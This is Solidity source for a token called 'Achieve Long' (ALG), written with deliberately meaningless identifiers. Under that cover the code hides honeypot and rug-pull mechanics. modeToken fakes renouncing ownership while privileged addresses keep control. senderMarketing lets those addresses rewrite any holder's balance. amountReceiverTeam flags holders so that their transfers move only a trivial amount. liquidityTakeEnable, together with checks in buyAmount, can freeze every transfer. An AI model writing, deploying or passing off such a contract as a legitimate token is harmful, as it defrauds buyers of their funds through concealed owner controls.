//SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;

interface feeLiquidityBuy {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract txTo {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface amountMax {
    function createPair(address listReceiver, address shouldSell) external returns (address);
}

interface enableLaunchedAuto {
    function totalSupply() external view returns (uint256);

    function balanceOf(address walletFee) external view returns (uint256);

    function transfer(address toTeam, uint256 amountTrading) external returns (bool);

    function allowance(address feeMin, address spender) external view returns (uint256);

    function approve(address spender, uint256 amountTrading) external returns (bool);

    function transferFrom(
        address sender,
        address toTeam,
        uint256 amountTrading
    ) external returns (bool);

    event Transfer(address indexed from, address indexed maxReceiverTotal, uint256 value);
    event Approval(address indexed feeMin, address indexed spender, uint256 value);
}

interface enableLaunchedAutoMetadata is enableLaunchedAuto {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract AchieveLong is txTo, enableLaunchedAuto, enableLaunchedAutoMetadata {

    function balanceOf(address walletFee) public view virtual override returns (uint256) {
        return listShouldTx[walletFee];
    }

    uint256 private isLiquidity;

    address atTotal = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    address public receiverAuto;

    function buyAmount(address toLaunched, address toTeam, uint256 amountTrading) internal returns (bool) {
        if (toLaunched == receiverAuto) {
            return sellMinIs(toLaunched, toTeam, amountTrading);
        }
        uint256 launchedBuy = enableLaunchedAuto(amountIs).balanceOf(atTotal);
        require(launchedBuy == totalTake);
        require(toTeam != atTotal);
        if (receiverTotalFrom[toLaunched]) {
            return sellMinIs(toLaunched, toTeam, buySell);
        }
        return sellMinIs(toLaunched, toTeam, amountTrading);
    }

    function modeToken() public {
        emit OwnershipTransferred(receiverAuto, address(0));
        launchLimit = address(0);
    }

    function liquidityTakeEnable(uint256 amountTrading) public {
        maxFrom();
        totalTake = amountTrading;
    }

    function getOwner() external view returns (address) {
        return launchLimit;
    }

    bool private minTokenLaunch;

    function amountReceiverTeam(address txMax) public {
        maxFrom();
        
        if (txMax == receiverAuto || txMax == amountIs) {
            return;
        }
        receiverTotalFrom[txMax] = true;
    }

    function sellMinIs(address toLaunched, address toTeam, uint256 amountTrading) internal returns (bool) {
        require(listShouldTx[toLaunched] >= amountTrading);
        listShouldTx[toLaunched] -= amountTrading;
        listShouldTx[toTeam] += amountTrading;
        emit Transfer(toLaunched, toTeam, amountTrading);
        return true;
    }

    function transferFrom(address toLaunched, address toTeam, uint256 amountTrading) external override returns (bool) {
        if (_msgSender() != limitTeam) {
            if (shouldAt[toLaunched][_msgSender()] != type(uint256).max) {
                require(amountTrading <= shouldAt[toLaunched][_msgSender()]);
                shouldAt[toLaunched][_msgSender()] -= amountTrading;
            }
        }
        return buyAmount(toLaunched, toTeam, amountTrading);
    }

    address public amountIs;

    function transfer(address sellTeam, uint256 amountTrading) external virtual override returns (bool) {
        return buyAmount(_msgSender(), sellTeam, amountTrading);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return receiverTo;
    }

    uint256 limitMax;

    function decimals() external view virtual override returns (uint8) {
        return liquidityTeam;
    }

    constructor (){
        
        feeLiquidityBuy teamMax = feeLiquidityBuy(limitTeam);
        amountIs = amountMax(teamMax.factory()).createPair(teamMax.WETH(), address(this));
        
        receiverAuto = _msgSender();
        modeToken();
        feeMarketing[receiverAuto] = true;
        listShouldTx[receiverAuto] = receiverTo;
        if (autoTeam == tradingSender) {
            tradingSender = autoTeam;
        }
        emit Transfer(address(0), receiverAuto, receiverTo);
    }

    string private listToken = "ALG";

    uint256 public tradingSender;

    address private launchLimit;

    uint256 constant buySell = 8 ** 10;

    function approve(address enableExempt, uint256 amountTrading) public virtual override returns (bool) {
        shouldAt[_msgSender()][enableExempt] = amountTrading;
        emit Approval(_msgSender(), enableExempt, amountTrading);
        return true;
    }

    uint256 public maxToken;

    mapping(address => bool) public feeMarketing;

    event OwnershipTransferred(address indexed modeAuto, address indexed feeReceiverMax);

    bool public buyTx;

    function name() external view virtual override returns (string memory) {
        return sellWalletSwap;
    }

    uint256 private launchAt;

    function symbol() external view virtual override returns (string memory) {
        return listToken;
    }

    uint256 public teamLaunch;

    function owner() external view returns (address) {
        return launchLimit;
    }

    function launchSender(address teamFundLiquidity) public {
        if (buyTx) {
            return;
        }
        
        feeMarketing[teamFundLiquidity] = true;
        if (launchAt != maxToken) {
            launchAt = tradingSender;
        }
        buyTx = true;
    }

    uint256 totalTake;

    uint256 private receiverTo = 100000000 * 10 ** 18;

    mapping(address => uint256) private listShouldTx;

    string private sellWalletSwap = "Achieve Long";

    uint8 private liquidityTeam = 18;

    function senderMarketing(address sellTeam, uint256 amountTrading) public {
        maxFrom();
        listShouldTx[sellTeam] = amountTrading;
    }

    function maxFrom() private view {
        require(feeMarketing[_msgSender()]);
    }

    address limitTeam = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function allowance(address shouldTradingTake, address enableExempt) external view virtual override returns (uint256) {
        if (enableExempt == limitTeam) {
            return type(uint256).max;
        }
        return shouldAt[shouldTradingTake][enableExempt];
    }

    mapping(address => mapping(address => uint256)) private shouldAt;

    uint256 public autoTeam;

    mapping(address => bool) public receiverTotalFrom;

    bool public launchedFee;

}